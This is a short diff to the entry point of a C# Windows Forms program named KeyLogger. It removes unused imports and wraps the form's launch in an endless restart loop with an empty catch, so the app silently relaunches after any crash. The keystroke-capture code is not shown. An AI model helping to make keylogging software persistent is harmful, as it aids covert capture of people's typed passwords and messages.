@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Windows.Forms;
 
 namespace KeyLogger
@@ -15,7 +13,15 @@ namespace KeyLogger
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new KeyLogger());
+            while (true)
+            {
+                try
+                {
+                    Application.Run(new KeyLogger());
+                }
+                catch
+                { }
+            }
         }
     }
 }
